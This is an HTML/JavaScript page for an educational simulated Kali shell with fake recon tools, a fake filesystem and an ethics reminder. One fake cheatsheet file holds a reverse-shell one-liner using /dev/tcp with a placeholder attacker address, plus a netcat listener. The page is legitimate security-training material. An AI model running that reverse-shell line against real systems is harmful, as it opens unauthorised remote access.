<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>HackLab Terminal — Practice Shell</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0a0e14;
    --panel: #0d1319;
    --border: #1a2332;
    --text: #c9d1d9;
    --green: #7ee787;
    --cyan: #79c0ff;
    --yellow: #ffd866;
    --red: #ff7b72;
    --purple: #d2a8ff;
    --dim: #6e7681;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 14px;
    overflow: hidden;
  }

  .window {
    height: 100vh;
    display: flex;
    flex-direction: column;
    background: var(--bg);
  }

  .titlebar {
    display: flex;
    align-items: center;
    gap: 0.6rem;
    padding: 0.7rem 1rem;
    background: var(--panel);
    border-bottom: 1px solid var(--border);
    user-select: none;
  }
  .dot { width: 12px; height: 12px; border-radius: 50%; }
  .dot.r { background: #ff5f56; }
  .dot.y { background: #ffbd2e; }
  .dot.g { background: #27c93f; }

  .title {
    flex: 1;
    text-align: center;
    color: var(--dim);
    font-size: 0.75rem;
  }

  .tab-hint {
    display: flex;
    gap: 0.4rem;
    font-size: 0.7rem;
    color: var(--dim);
  }
  .tab-hint span {
    padding: 0.15rem 0.5rem;
    border: 1px solid var(--border);
    border-radius: 4px;
  }

  .term {
    flex: 1;
    overflow-y: auto;
    padding: 1.2rem 1.5rem;
    line-height: 1.6;
    white-space: pre-wrap;
    word-break: break-word;
  }

  .term::-webkit-scrollbar { width: 10px; }
  .term::-webkit-scrollbar-track { background: var(--bg); }
  .term::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
  .term::-webkit-scrollbar-thumb:hover { background: #2a3546; }

  .line { margin-bottom: 0.1rem; }

  .prompt-user { color: var(--green); font-weight: 500; }
  .prompt-host { color: var(--cyan); font-weight: 500; }
  .prompt-path { color: var(--purple); font-weight: 500; }
  .prompt-sym  { color: var(--dim); }

  .out      { color: var(--text); }
  .out-err  { color: var(--red); }
  .out-warn { color: var(--yellow); }
  .out-info { color: var(--cyan); }
  .out-ok   { color: var(--green); }
  .dim      { color: var(--dim); }

  .input-line {
    display: flex;
    align-items: center;
    padding: 0.6rem 1.5rem 1rem;
    border-top: 1px solid var(--border);
    background: var(--panel);
  }

  .input-line .prompt {
    margin-right: 0.6rem;
    font-size: 0.85rem;
    white-space: nowrap;
  }

  #cmd {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text);
    font-family: inherit;
    font-size: 0.9rem;
    caret-color: var(--green);
  }

  .cursor-blink {
    display: inline-block;
    width: 8px;
    height: 1.05em;
    background: var(--green);
    vertical-align: text-bottom;
    animation: blink 1s steps(2) infinite;
  }
  @keyframes blink { 50% { opacity: 0; } }

  .ascii {
    color: var(--green);
    font-size: 0.7rem;
    line-height: 1.1;
  }
</style>
</head>
<body>

<div class="window">
  <div class="titlebar">
    <span class="dot r"></span>
    <span class="dot y"></span>
    <span class="dot g"></span>
    <div class="title">kali@hacklab: ~ — simulated shell v3</div>
    <div class="tab-hint">
      <span>↑↓ history</span>
      <span>Tab complete</span>
    </div>
  </div>

  <div class="term" id="term"></div>

  <div class="input-line">
    <span class="prompt" id="prompt">
      <span class="prompt-user">kali</span><span class="prompt-sym">@</span><span class="prompt-host">hacklab</span><span class="prompt-sym">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
    </span>
    <input id="cmd" autocomplete="off" autocapitalize="off" spellcheck="false" autofocus />
  </div>
</div>

<script>
/* =========================================================
   HackLab Terminal — Simulated Kali Shell
   Educational use only. No real network/system access.
   ========================================================= */

const term = document.getElementById('term');
const input = document.getElementById('cmd');
const promptEl = document.getElementById('prompt');

/* ---------- Fake filesystem ---------- */
const fs = {
  '/': ['home', 'etc', 'var', 'tmp', 'usr', 'opt', 'root'],
  '/home': ['kali'],
  '/home/kali': ['Documents', 'Downloads', 'loot', 'notes.txt', 'scan.sh', 'wordlist.txt'],
  '/home/kali/Documents': ['cheatsheet.md', 'methodology.pdf'],
  '/home/kali/Downloads': ['rockyou.txt.gz', 'payload.bin'],
  '/home/kali/loot': ['.keep'],
  '/etc': ['passwd', 'hosts', 'shadow', 'os-release'],
  '/var': ['log'],
  '/var/log': ['auth.log', 'syslog'],
  '/tmp': [],
  '/usr': ['bin', 'share'],
  '/opt': [],
  '/root': ['.bashrc']
};

const fileContents = {
  '/home/kali/notes.txt':
`# My HTB / TryHackMe Notes
- Always nmap first: nmap -sV -sC -oA scan <IP>
- Check /etc/hosts for vhosts
- Gobuster for dirs: gobuster dir -u http://<IP> -w wordlist.txt
- Never skip the easy stuff (robots.txt, /admin, default creds)
- STOP. THINK. ENUMERATE MORE.`,
  '/home/kali/Documents/cheatsheet.md':
`# Quick Cheatsheet
## Recon
nmap -sV -sC -p- <target>
## Web
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
nikto -h http://<target>
## SMB
enum4linux -a <target>
smbclient -L //<target>
## Shells
nc -lvnp 4444
bash -i >& /dev/tcp/<your_ip>/4444 0>&1`,
  '/etc/hosts':
`127.0.0.1       localhost
127.0.1.1       hacklab
# 10.10.10.5    target.htb   <-- add HTB targets here`,
  '/etc/os-release':
`NAME="Kali GNU/Linux"
VERSION="2025.1"
ID=kali
PRETTY_NAME="Kali GNU/Linux Rolling"`,
  '/etc/passwd':
`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
kali:x:1000:1000:Kali User,,,:/home/kali:/bin/bash`,
  '/home/kali/wordlist.txt':
`admin
password
letmein
root
123456
qwerty
changeme
hacker
guest`
};

/* ---------- Simulated network targets (for nmap demo) ---------- */
const targets = {
  '10.10.10.5': {
    hostname: 'target.htb',
    ports: [
      { port: 22,   state: 'open', service: 'ssh',   version: 'OpenSSH 8.2p1 Ubuntu' },
      { port: 80,   state: 'open', service: 'http',  version: 'Apache httpd 2.4.41' },
      { port: 443,  state: 'open', service: 'https', version: 'Apache httpd 2.4.41' },
      { port: 3306, state: 'open', service: 'mysql', version: 'MySQL 8.0.27' }
    ]
  },
  '10.10.10.6': {
    hostname: 'box2.htb',
    ports: [
      { port: 21,   state: 'open', service: 'ftp',   version: 'vsftpd 3.0.3' },
      { port: 445,  state: 'open', service: 'smb',   version: 'Samba 4.13.17' },
      { port: 8080, state: 'open', service: 'http',  version: 'nginx 1.18.0' }
    ]
  }
};

/* ---------- State ---------- */
let cwd = '/home/kali';
let history = [];
let historyIdx = -1;

/* ---------- Helpers ---------- */
function write(html, cls='out') {
  const line = document.createElement('div');
  line.className = 'line ' + cls;
  line.innerHTML = html;
  term.appendChild(line);
  term.scrollTop = term.scrollHeight;
}
function writeRaw(text, cls='out') { write(escape(text), cls); }
function escape(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function promptStr() {
  const short = cwd === '/home/kali' ? '~' : (cwd.startsWith('/home/kali/') ? '~' + cwd.slice(10) : cwd);
  return `<span class="prompt-user">kali</span><span class="prompt-sym">@</span><span class="prompt-host">hacklab</span><span class="prompt-sym">:</span><span class="prompt-path">${short}</span><span class="prompt-sym">$</span>`;
}
function updatePrompt() {
  promptEl.innerHTML = promptStr();
}
function resolvePath(p) {
  if (!p) return cwd;
  if (p.startsWith('/')) return p.replace(/\/+$/,'') || '/';
  if (p === '~') return '/home/kali';
  if (p.startsWith('~/')) return '/home/kali/' + p.slice(2);
  const parts = (cwd + '/' + p).split('/');
  const out = [];
  for (const part of parts) {
    if (!part || part === '.') continue;
    if (part === '..') out.pop();
    else out.push(part);
  }
  return '/' + out.join('/');
}
function dirOf(p) { return p.substring(0, p.lastIndexOf('/')) || '/'; }
function baseOf(p) { return p.substring(p.lastIndexOf('/') + 1); }

/* ---------- Commands ---------- */
const commands = {};

commands.help = () => {
  write(`<span class="out-ok">HackLab Simulated Shell — Available Commands</span>`);
  write(`<span class="dim">── Navigation ─────────────────────────────</span>`);
  write(`  ls, cd, pwd, cat, tree, find, file`);
  write(`<span class="dim">── Recon (simulated) ──────────────────────</span>`);
  write(`  nmap, whois, dig, ping, gobuster, nikto`);
  write(`<span class="dim">── System ─────────────────────────────────</span>`);
  write(`  whoami, id, uname, date, hostname, uptime, ps, env`);
  write(`<span class="dim">── Fun & Info ─────────────────────────────</span>`);
  write(`  banner, targets, ethics, clear, history, echo`);
  write(`<span class="dim">── Tip ────────────────────────────────────</span>`);
  write(`  Type <span class="out-info">targets</span> to see practice IPs, then try <span class="out-info">nmap 10.10.10.5</span>`);
};

commands.ls = (args) => {
  const path = resolvePath(args[0]);
  if (fs[path]) {
    const items = fs[path];
    if (items.length === 0) return;
    const colored = items.map(f => {
      const full = (path === '/' ? '' : path) + '/' + f;
      if (fs[full]) return `<span class="out-info">${f}/</span>`;
      if (f.endsWith('.sh')) return `<span class="out-ok">${f}</span>`;
      return f;
    });
    write(colored.join('   '));
  } else if (fileContents[path]) {
    write(fs[dirOf(path)].join('   '));
  } else {
    write(`ls: cannot access '${args[0] || path}': No such file or directory`, 'out-err');
  }
};

commands.pwd = () => write(cwd);

commands.cd = (args) => {
  const target = args[0] || '/home/kali';
  const path = resolvePath(target);
  if (fs[path]) { cwd = path; updatePrompt(); return; }
  if (fileContents[path]) { write(`cd: not a directory: ${target}`, 'out-err'); return; }
  write(`cd: no such file or directory: ${target}`, 'out-err');
};

commands.cat = (args) => {
  if (!args[0]) { write('cat: missing file operand', 'out-err'); return; }
  const path = resolvePath(args[0]);
  if (fileContents[path]) {
    write(escape(fileContents[path]));
  } else if (fs[path]) {
    write(`cat: ${args[0]}: Is a directory`, 'out-err');
  } else {
    write(`cat: ${args[0]}: No such file or directory`, 'out-err');
  }
};

commands.tree = (args) => {
  const start = resolvePath(args[0]) || cwd;
  function walk(path, prefix='') {
    if (!fs[path]) return;
    fs[path].forEach((item, i) => {
      const full = (path === '/' ? '' : path) + '/' + item;
      const isDir = !!fs[full];
      const last = i === fs[path].length - 1;
      const branch = last ? '└── ' : '├── ';
      write(prefix + branch + (isDir ? `<span class="out-info">${item}/</span>` : item));
      if (isDir) walk(full, prefix + (last ? '    ' : '│   '));
    });
  }
  write(`<span class="out-info">${start}</span>`);
  walk(start);
};

commands.whoami = () => write('kali');
commands.id = () => write('uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),100(users)');
commands.hostname = () => write('hacklab');
commands.uname = () => write('Linux hacklab 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.5.6-1kali1 (2025-01-15) x86_64 GNU/Linux');
commands.date = () => write(new Date().toString());
commands.uptime = () => write(` ${new Date().toTimeString().slice(0,8)} up 3 days,  2:47,  1 user,  load average: 0.15, 0.09, 0.07`);
commands.ps = () => {
  write('  PID TTY          TIME CMD');
  write(' 1234 pts/0    00:00:00 bash');
  write(' 5678 pts/0    00:00:00 ps');
};
commands.env = () => {
  write('USER=kali');
  write('HOME=/home/kali');
  write('SHELL=/bin/bash');
  write('PWD=' + cwd);
  write('TERM=xterm-256color');
};
commands.echo = (args) => write(escape(args.join(' ')));

commands.history = () => {
  if (history.length === 0) { write('(no history)', 'dim'); return; }
  history.forEach((h, i) => write(`  ${String(i+1).padStart(3)}  ${escape(h)}`));
};

commands.clear = () => { term.innerHTML = ''; };

commands.banner = () => {
  const b = [
    " _   _            _    _          _     ",
    "| | | | __ _  ___| | _| |    __ _| |__  ",
    "| |_| |/ _` |/ __| |/ / |   / _` | '_ \\ ",
    "|  _  | (_| | (__|   <| |__| (_| | |_) |",
    "|_| |_|\\__,_|\\___|_|\\_\\_____\\__,_|_.__/ "
  ].join('\n');
  write(`<span class="ascii">${escape(b)}</span>`);
  write(`<span class="dim">Simulated shell for learning. No real network access.</span>`);
};

commands.ethics = () => {
  write(`<span class="out-ok">The White Hat Code</span>`);
  write(`  1. Only test systems you own or have WRITTEN permission for.`);
  write(`  2. Do no harm — never damage, delete, or leak data.`);
  write(`  3. Stay legal — CFAA / CMA / GDPR apply to you.`);
  write(`  4. Report responsibly — disclose privately, not publicly.`);
  write(`<span class="dim">Use HTB/TryHackMe for legal practice: they give you permission.</span>`);
};

commands.targets = () => {
  write(`<span class="out-ok">Practice Targets (simulated — no real network)</span>`);
  write(`<span class="dim">── Use these with nmap, gobuster, etc. ─────</span>`);
  for (const [ip, t] of Object.entries(targets)) {
    write(`  <span class="out-info">${ip}</span>   ${t.hostname}   (${t.ports.length} open ports)`);
  }
  write(`<span class="dim">Try: nmap 10.10.10.5</span>`);
};

/* ---------- Simulated recon tools ---------- */
commands.nmap = (args) => {
  const ip = args.find(a => /^\d+\.\d+\.\d+\.\d+$/.test(a));
  if (!ip) {
    write(`<span class="out-ok">Nmap 7.94 (simulated)</span>`);
    write(`Usage: nmap [options] <target>`);
    write(`Try: nmap 10.10.10.5   (see 'targets' for IPs)`);
    return;
  }
  const t = targets[ip];
  if (!t) {
    write(`Note: Host ${ip} seems down in this simulation.`, 'out-warn');
    write(`Available simulated targets: ${Object.keys(targets).join(', ')}`, 'dim');
    return;
  }
  write(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}`);
  write(`Nmap scan report for ${t.hostname} (${ip})`);
  write(`Host is up (0.023s latency).`);
  write(`Not shown: 995 closed tcp ports (reset)`);
  write(`PORT     STATE SERVICE  VERSION`);
  t.ports.forEach(p => {
    write(`<span class="out-ok">${String(p.port).padEnd(8)} ${p.state.padEnd(6)} ${p.service.padEnd(8)} ${p.version}</span>`);
  });
  write(`\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds`);
  write(`<span class="dim">→ Next steps: try 'gobuster http://${ip}' or 'nikto ${ip}'</span>`);
};

commands.whois = (args) => {
  const ip = args[0];
  if (!ip) { write('whois: missing argument', 'out-err'); return; }
  write(`% Whois (simulated) for ${escape(ip)}`);
  write(`inetnum:     10.0.0.0 - 10.255.255.255`);
  write(`netname:     PRIVATE-LAB-RANGE`);
  write(`descr:       Simulated HackLab range — not a real network`);
  write(`country:     LAB`);
};

commands.dig = (args) => {
  const dom = args[0] || 'hacklab.local';
  write(`; <<>> DiG 9.18 <<>> ${escape(dom)}`);
  write(`;; ANSWER SECTION:`);
  write(`${escape(dom)}.   300   IN   A   10.10.10.5`);
  write(`;; Query time: 12 msec`);
};

commands.ping = (args) => {
  const host = args[0];
  if (!host) { write('ping: usage: ping <host>', 'out-err'); return; }
  write(`PING ${escape(host)} (${escape(host)}) 56(84) bytes of data.`);
  let i = 0;
  const iv = setInterval(() => {
    write(`64 bytes from ${escape(host)}: icmp_seq=${i+1} ttl=63 time=${(Math.random()*5 + 1).toFixed(1)} ms`);
    i++;
    if (i >= 4) {
      clearInterval(iv);
      write(`\n--- ${escape(host)} ping statistics ---`);
      write(`4 packets transmitted, 4 received, 0% packet loss`);
      write(`<span class="dim">(simulated — no packets actually sent)</span>`);
    }
  }, 400);
};

commands.gobuster = (args) => {
  const url = args.find(a => a.startsWith('http'));
  if (!url) {
    write(`<span class="out-ok">Gobuster (simulated)</span>`);
    write(`Usage: gobuster dir -u http://<target> -w <wordlist>`);
    write(`Try: gobuster dir -u http://10.10.10.5 -w wordlist.txt`);
    return;
  }
  write(`===============================================================`);
  write(`Gobuster v3.6 (simulated)`);
  write(`===============================================================`);
  write(`[+] Url:            ${escape(url)}`);
  write(`[+] Threads:        10`);
  const found = ['/admin', '/login', '/backup', '/robots.txt', '/.git/', '/api'];
  let i = 0;
  const iv = setInterval(() => {
    if (i >= found.length) {
      clearInterval(iv);
      write(`===============================================================`);
      write(`<span class="dim">(simulated — no real requests sent)</span>`);
      return;
    }
    const code = [200, 301, 403, 200, 200, 200][i];
    write(`${found[i]}   (Status: ${code}) [Size: ${Math.floor(Math.random()*2000)+100}]`);
    i++;
  }, 350);
};

commands.nikto = (args) => {
  const host = args[0];
  if (!host) { write('nikto: missing target. Usage: nikto <host>', 'out-err'); return; }
  write(`- Nikto v2.5.0 (simulated)`);
  write(`+ Target IP:     ${escape(host)}`);
  write(`+ Target Hostname: ${escape(host)}`);
  write(`+ Server: Apache/2.4.41 (Ubuntu)`);
  write(`+ /: The anti-clickjacking X-Frame-Options header is not present.`);
  write(`+ /admin/: Directory indexing found.`);
  write(`+ /backup/: Backup files may be exposed.`);
  write(`+ /robots.txt: Entry '/secret' found.`);
  write(`+ 6 items checked — <span class="out-warn">3 potential issues</span>`);
  write(`<span class="dim">(simulated — no real requests sent)</span>`);
};

commands.file = (args) => {
  if (!args[0]) { write('file: missing operand', 'out-err'); return; }
  const path = resolvePath(args[0]);
  if (fileContents[path]) write(`${args[0]}: ASCII text`);
  else write(`${args[0]}: cannot open (no such file)`, 'out-err');
};

commands.find = (args) => {
  write(`<span class="dim">find is simplified in this sim. Try: tree</span>`);
};

/* ---------- Command aliases ---------- */
commands['?'] = commands.help;
commands['exit'] = () => write('There is no escape from learning. 😈 (type clear to reset)', 'out-warn');
commands['sudo'] = (args) => {
  if (args[0] === 'rm' && args[1] === '-rf' && args[2] === '/') {
    write(`Nice try. This is a simulator — and also, that's a crime. 🚔`, 'out-err');
    return;
  }
  if (!args.length) { write('usage: sudo <command>', 'out-err'); return; }
  write(`[sudo] password for kali:`);
  write(`<span class="out-err">Sorry, try again.</span>`);
  write(`<span class="dim">(sudo is disabled in the sim — you don't need root to learn.)</span>`);
};

/* ---------- Input handling ---------- */
function run(raw) {
  const trimmed = raw.trim();
  if (!trimmed) {
    write(promptStr(), 'out');
    return;
  }
  history.push(trimmed);
  historyIdx = history.length;

  // Echo the prompt + command
  write(promptStr() + ' ' + escape(trimmed));

  // Parse
  const parts = trimmed.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  if (commands[cmd]) {
    try { commands[cmd](args); }
    catch (e) { write('error: ' + e.message, 'out-err'); }
  } else {
    write(`${escape(cmd)}: command not found. Type 'help'.`, 'out-err');
  }
}

/* ---------- History / Tab ---------- */
input.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    const val = input.value;
    input.value = '';
    run(val);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (historyIdx > 0) {
      historyIdx--;
      input.value = history[historyIdx];
      setTimeout(() => input.setSelectionRange(input.value.length, input.value.length), 0);
    }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (historyIdx < history.length - 1) {
      historyIdx++;
      input.value = history[historyIdx];
    } else {
      historyIdx = history.length;
      input.value = '';
    }
  } else if (e.key === 'Tab') {
    e.preventDefault();
    const val = input.value;
    const parts = val.split(' ');
    const last = parts[parts.length - 1];
    // Complete command
    if (parts.length === 1) {
      const matches = Object.keys(commands).filter(c => c.startsWith(last));
      if (matches.length === 1) input.value = matches[0] + ' ';
      else if (matches.length > 1) write(matches.join('   '), 'dim');
    } else {
      // Complete filename in current dir
      const files = fs[cwd] || [];
      const matches = files.filter(f => f.startsWith(last));
      if (matches.length === 1) {
        parts[parts.length - 1] = matches[0];
        input.value = parts.join(' ');
      } else if (matches.length > 1) write(matches.join('   '), 'dim');
    }
  }
});

/* ---------- Focus input on click anywhere ---------- */
document.body.addEventListener('click', () => input.focus());
